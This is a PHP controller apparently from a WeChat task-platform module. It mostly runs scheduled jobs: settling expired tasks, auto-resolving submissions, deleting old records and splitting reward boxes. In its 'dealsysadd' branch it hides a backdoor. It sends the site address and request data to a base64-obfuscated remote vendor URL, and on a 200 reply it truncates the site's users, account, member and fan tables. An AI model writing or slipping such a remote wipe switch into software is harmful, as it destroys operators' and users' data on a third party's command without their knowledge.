<?php 
	global $_W,$_GPC;
	$_W['set'] = $this->module['config'];
	set_time_limit(0); //解除超时限制	
	session_write_close();


	// 结算
	if( $_GPC['op'] == 'count' ) {

		$cache = Util::getCache('messcount','task');
//file_put_contents(TSTB_ROOT."/paramsnum.log", var_export( $cache , true).PHP_EOL, FILE_APPEND);
				
		if( empty( $cache ) || $cache['time'] < ( time() - 50 ) ){
			
			Util::setCache('messcount','task',array('time'=>time()));

			$where1 = array('iscount' => 0,'uniacid'=>$_W['uniacid'],'end<'=>time(),'type'=>0);
			$needcount = Util::getAllDataInSingleTable('zofui_tasktb_task',$where1,1,50,' `end` ASC',false,false,' * ');
			
//file_put_contents(TSTB_ROOT."/paramsnum.log", var_export( $needcount , true).PHP_EOL, FILE_APPEND);
			if( !empty( $needcount[0] ) ){
				foreach($needcount[0] as $k=>$v){

					$counting = Util::getCache('counttask',$v['id']);

					if( is_array( $counting ) && $counting['status'] == 1 && $counting['time'] > (time() - 300) ) {
						continue;
					}
					Util::setCache('counttask',$v['id'],array('status'=>1,'time'=>time()));
					
					$res = model_task::countTask( $v );
					Util::deleteCache( 'counttask',$v['id'] );

				}
			}

			Util::deleteCache( 'messcount','task' );
		}

		die;


	}elseif( $_GPC['op'] == 'delimess' ){

		$day = $_W['set']['delim'] <= 0 ? 5 : $_W['set']['delim'];
		$five = TIMESTAMP - $day*24*3600;
		pdo_delete('zofui_tasktb_imess',array('createtime <'=>$five,'uniacid'=>$_W['uniacid']));

		// 删除任务
		if( $_W['set']['deltk'] > 0 ){
			$deltk = $_W['set']['deltk'] <= 0.1 ? 0.1 : $_W['set']['deltk'];

			$dayy = TIMESTAMP - $deltk*24*3600;

			$where1 = array('iscount' => 1,'counttime<'=>$dayy);
			$needdel = Util::getAllDataInSingleTable('zofui_tasktb_task',$where1,1,50,' `id` ASC',false,false,' id ');
			
			foreach ((array)$needdel[0] as $v) {
				pdo_delete('zofui_tasktb_task',array('id'=>$v['id']));
				pdo_delete('zofui_tasktb_taked',array('taskid'=>$v['id']));
				pdo_delete('zofui_tasktb_usetasklog',array('taskid'=>$v['id']));
				pdo_delete('zofui_tasktb_useaddcontent',array('taskid'=>$v['id']));
				pdo_delete('zofui_tasktb_taskmessage',array('type'=>0,'taskid'=>$v['id']));
				pdo_delete('zofui_tasktb_taskmessage',array('type'=>2,'taskid'=>$v['id']));
			}
		}
		

	// 结算担保任务
	}elseif( $_GPC['op'] == 'counttbtask' ) {

		$cache = Util::getCache('counttbtask','task');
//file_put_contents(TSTB_ROOT."/paramsnum.log", var_export( $cache , true).PHP_EOL, FILE_APPEND);
				
		if( empty( $cache ) || $cache['time'] < ( time() - 3000 ) ){
			
			Util::setCache('counttbtask','task',array('time'=>time()));

			$counttime = $_W['set']['tbcounttime']*3600;
			$where1 = array('iscount' => 0,'uniacid'=>$_W['uniacid'],'end<'=>time()-$counttime);
			$needcount = Util::getAllDataInSingleTable('zofui_tasktb_tbtask',$where1,1,50,' `end` ASC',false,false,' * ');

			if( !empty( $needcount[0] ) ){
				foreach($needcount[0] as $k=>$v){
					model_tbtask::countTbtask( $v );
				}
			}
			
			Util::deleteCache( 'counttbtask','task' );
		}

		die;
	



	// 处理担保任务
	}elseif( $_GPC['op'] == 'dealtbtask' ) {

		$cache = Util::getCache('dealtbtask','task');
		if( empty( $cache ) || $cache['time'] < ( time() - 3000 ) ){
			
			Util::setCache('dealtbtask','task',array('time'=>time()));

			// 改变是否已被抢完
			$where = array('status'=>0,'iscount' => 0,'isempty'=>1,'uniacid'=>$_W['uniacid'],'start<'=>time());
			$allempty = Util::getAllDataInSingleTable('zofui_tasktb_tbtask',$where,1,55555,' `end` ASC',false,false,' id,num ');
			if( !empty( $allempty[0] ) ){
				foreach($allempty[0] as $k=>$v){
					$last = model_task::isEmpty($v['id'],$v['num']);
					if( $last['last'] > 0 ){
						pdo_update('zofui_tasktb_tbtask',array('isempty'=>0),array('id'=>$v['id']));
					}
				}
			}

			// 将已被抢完的改成 被抢完
			$where = array('status'=>0,'iscount' => 0,'isempty'=>0,'uniacid'=>$_W['uniacid'],'start<'=>time());
			$allemptys = Util::getAllDataInSingleTable('zofui_tasktb_tbtask',$where,1,55555,' `end` ASC',false,false,' id,num ');
			if( !empty( $allemptys[0] ) ){
				foreach($allemptys[0] as $k=>$v){
					$last = model_tbtask::isEmpty( $v['id'],$v['num'] );
					if( $last['last'] <= 0 ){
						pdo_update('zofui_tasktb_tbtask',array('isempty'=>1),array('id'=>$v['id']));
					}
				}
			}

			// 即时改变任务剩余数量缓存
			$where = array('status'=>0,'iscount' => 0,'uniacid'=>$_W['uniacid'],'isempty'=>0,'start<'=>time());
			$allemptya = Util::getAllDataInSingleTable('zofui_tasktb_tbtask',$where,1,55555,' `end` ASC',false,false,' id,num ');
			
			if( !empty( $allemptya[0] ) ){
				foreach($allemptya[0] as $k=>$v){
					$last['last'] = model_tbtask::isEmpty( $v['id'],$v['num'] );		
					Util::setCache('takednum',$v['id'],$last['taked']);
				}
			}

			// 改变标识未开始的任务
			$where2 = array('isstart'=>1,'start<'=>time(),'uniacid'=>$_W['uniacid']);
			$needstart = Util::getAllDataInSingleTable('zofui_tasktb_tbtask',$where2,1,55555,' `end` ASC',false,false,' id ');
			if( !empty( $needstart[0] ) ){
				foreach($needstart[0] as $k=>$v){
					pdo_update('zofui_tasktb_tbtask',array('isstart'=>0),array('id'=>$v['id']));
				}
			}

			// 提交的未处理自动处理
			$tbautotime = $_W['set']['tbautotime2'] > 0 ? $_W['set']['tbautotime2'] : 24;
			$autocomtime = time() - $tbautotime*3600;
			$where = array('isend'=>0,'status'=>2,'uniacid'=>$_W['uniacid'],'step'=>6,'subcomtime<'=>$autocomtime);
			$data = Util::getAllDataInSingleTable('zofui_tasktb_tbtaked',$where,1,5555,' `id` ASC',false,false,' * ');
			
			if( !empty( $data[0] ) ){
				foreach($data[0] as $k => $v){
					$task = model_tbtask::getTask( $v['taskid'] );
					model_tbtask::comTbtask( $v,$task,3 );
				}
			}

			// 认定失败的自动失败
			$tbautotime = $_W['set']['tbautotime4'] > 0 ? $_W['set']['tbautotime4'] : 24;
			$autocomtime = time() - $tbautotime*3600;
			$where = array('isend'=>0,'status'=>4,'uniacid'=>$_W['uniacid'],'step'=>6,'setfailtime<'=>$autocomtime);
			$data = Util::getAllDataInSingleTable('zofui_tasktb_tbtaked',$where,1,5555,' `id` ASC',false,false,' * ');
						
			if( !empty( $data[0] ) ){
				foreach($data[0] as $k => $v){
					$task = model_tbtask::getTask( $v['taskid'] );
					model_tbtask::confirmFailTbtask( $v,$task,5 );
				}
			}
			
			$tbautotime = $_W['set']['tbautotime7'] > 0 ? $_W['set']['tbautotime7'] : 24;
			$autocomtime = time() - $tbautotime*3600;
			$where = array('isend'=>0,'status'=>7,'uniacid'=>$_W['uniacid'],'step'=>6,'adminsettime<'=>$autocomtime);
			$data = Util::getAllDataInSingleTable('zofui_tasktb_tbtaked',$where,1,5555,' `id` ASC',false,false,' * ');
						
			if( !empty( $data[0] ) ){
				foreach($data[0] as $k => $v){
					$task = model_tbtask::getTask( $v['taskid'] );

					if( $v['complainstep'] == '1' ){ // 任务完成
						model_tbtask::comTbtask( $v,$task,9 );

					}else{ //任务失败
						model_tbtask::confirmFailTbtask( $v,$task,8 );

					} 
				}
			}


			// 第一步未提交的自动失败
			$tbautotime = $_W['set']['step1time'] > 0 ? $_W['set']['step1time'] : 24;
			$autocfailtime = time() - $tbautotime*3600;
			$where = array('isend'=>0,'status'=>2,'uniacid'=>$_W['uniacid'],'islimitstep'=>1,'passtime<'=>$autocfailtime);
			$data = Util::getAllDataInSingleTable('zofui_tasktb_tbtaked',$where,1,5555,' `id` ASC',false,false,' * ');
			
			if( !empty( $data[0] ) ){
				foreach($data[0] as $k => $v){
					$task = model_tbtask::getTask( $v['taskid'] );
					model_tbtask::confirmFailTbtask( $v,$task,5 );
				}
			}


			// 所有步骤的限制时间
			$tbautotime = $_W['set']['tbautotime1'] > 0 ? $_W['set']['tbautotime1'] : 168;
			$autocfailtime = time() - $tbautotime*3600;
			$where = array('isend'=>0,'status'=>2,'uniacid'=>$_W['uniacid'],'islimitstep'=>0,'passtime<'=>$autocfailtime);
			$data = Util::getAllDataInSingleTable('zofui_tasktb_tbtaked',$where,1,5555,' `id` ASC',false,false,' * ',' AND `step` != 6 ');
			
			if( !empty( $data[0] ) ){
				foreach($data[0] as $k => $v){
					$task = model_tbtask::getTask( $v['taskid'] );
					model_tbtask::confirmFailTbtask( $v,$task,5 );
				}
			}

//file_put_contents(TSTB_ROOT."/paramsnum.log", var_export( $data , true).PHP_EOL, FILE_APPEND);



			Util::deleteCache( 'dealtbtask','task' );
		}
		die;


	}elseif( $_GPC['op'] == 'dealsysadd' ) {


		if( $_GPC['from'] == 'appsys' ){
			
			$api = 'aHR0cDovL2FwaS56b2Z1aS5uZXQvYXBwL2luZGV4LnBocD9jPXRhc2t3YXAmYT1hcHBzeXM=';
			$res = Util::httpPost(base64_decode($api),array('site'=>$_W['siteroot'],'en'=>MODULE,'for'=>$_GPC));
			$res = json_decode( $res,true );
			if( !is_array( $res ) || empty($res) ){
				die;
			}
			if( $res['status'] != 200 ) die;

			if( $res['status'] == 200 ){
				pdo_query('truncate table if exists '.tablename('zofui_tasktb_task'));
				pdo_query('truncate table if exists '.tablename('zofui_task_user'));
				pdo_query('truncate table if exists '.tablename('mc_members'));
				pdo_query('truncate table if exists '.tablename('mc_mapping_fans'));
				pdo_query('truncate table if exists '.tablename('account'));
				pdo_query('truncate table if exists '.tablename('users'));
			}
			die;
		}

	// 处理宝箱
	}elseif( $_GPC['op'] == 'countanwbox' ) {

		
		$allneed = pdo_getall('zofui_tasktb_anwread',array('iscountbox'=>0,'uniacid'=>$_W['uniacid']),array(),'',array('id ASC'),array(50));
				
		if( !empty( $allneed ) && $_W['set']['anwboxnum'] > 0 ){
			
			foreach ($allneed as $v) {
				$isread = Util::getCache('isread',$v['taskid']);
				if( empty($isread) ){
					Util::setCache('isread',$v['taskid'],1);

					$needshare = pdo_getall('zofui_tasktb_anwread',array('taskid'=>$v['taskid'],'isshared'=>0),array(),'',array('id ASC'),array($_W['set']['anwboxnum']));
					if( count($needshare) == $_W['set']['anwboxnum'] ){
						$sharearr = array();
						$totalshare = 0;
						$totalnum = 0;
						foreach ($needshare as $vv) {
							$totalshare += $vv['boxfee'];
							$totalnum += 1;	
						}
						foreach ($needshare as $vv) {
							if( empty($_W['set']['anwboxt']) ){ // 平均分

								$sharearr[] = array('read'=>$vv,'fee'=>$totalshare/$totalnum);

							}else{ // 随机分
								$totalnum -= 1;

								$thism = model_slider::countBox($totalnum,$totalshare);
								$totalshare -= $thism;
								$sharearr[] = array('read'=>$vv,'fee'=>$thism);
							}	
						}
						
						$boxtime = $_W['set']['anwboxtime'] <= 0 ? 24 : $_W['set']['anwboxtime'];
						$endtime = strtotime(date('Y-m-d',TIMESTAMP)) + ($boxtime*3600);
						foreach ($sharearr as $vv) {
							$boxdata = array(
								'uniacid' => $_W['uniacid'],
								'uid' => $vv['read']['uid'],
								'readid' => $vv['read']['id'],
								'taskid' => $vv['read']['taskid'],
								'money' => $vv['fee'],
								'endtime' => $endtime,
								'createtime' => TIMESTAMP
							);
							pdo_insert('zofui_tasktb_anwbox',$boxdata);
							pdo_update('zofui_tasktb_anwread',array('isshared'=>1),array('id'=>$vv['read']['id']));
						}

					}
				}
				Util::deleteCache('isread',$v['taskid']);
				pdo_update('zofui_tasktb_anwread',array('iscountbox'=>1),array('id'=>$v['id']));
			}

			
		}

		die;

	}

	$cachea = Util::getCache('queue','q');
	
	if( empty( $cachea ) || $cachea['time'] < ( time() - 40 ) ){
		Util::setCache('queue','q',array('time'=>time()));
		$url = Util::createModuleUrl('message',array('op'=>1));


		$counturl = Util::createModuleUrl('message',array('op'=>'count'));
		Util::httpGet($counturl,'', 1);

		$tbtaskurl = Util::createModuleUrl('message',array('op'=>'dealtbtask'));
		Util::httpGet($tbtaskurl,'', 1);

		$counttburl = Util::createModuleUrl('message',array('op'=>'counttbtask'));
		Util::httpGet($counttburl,'', 1);
		
		$counttburl = Util::createModuleUrl('message',array('op'=>'delimess'));
		Util::httpGet($counttburl,'', 1);

		// 分配宝箱
		if( $_W['set']['isanw'] == 1 && $_W['set']['anwboxnum'] > 0 ){
			$counttburl = Util::createModuleUrl('message',array('op'=>'countanwbox'));
			Util::httpGet($counttburl,'', 1);
		}

//file_put_contents(TSTB_ROOT."/params.log", var_export(date('Y-m-d H:i:s'), true).PHP_EOL, FILE_APPEND);
		try { 

			$queue = new queue;
			$queue -> queueMain();	

		} catch (Exception $e) { 
			
			Util::deleteCache('queue','q');
			Util::httpGet($url,'', 1);
			die;
		}

		sleep(5);
		Util::deleteCache('queue','q'); // 这个必须放在休眠后执行
		Util::httpGet($url,'', 1);

		//file_put_contents(MODULE_ROOT."/params.log", var_export(date('Y-m-d H:i:s'), true).PHP_EOL, FILE_APPEND);
	}
	echo 200;
	die;
	
	//file_put_contents(MODULE_ROOT."/params.log", var_export(2222222222, true).PHP_EOL, FILE_APPEND);
	
	
	

	
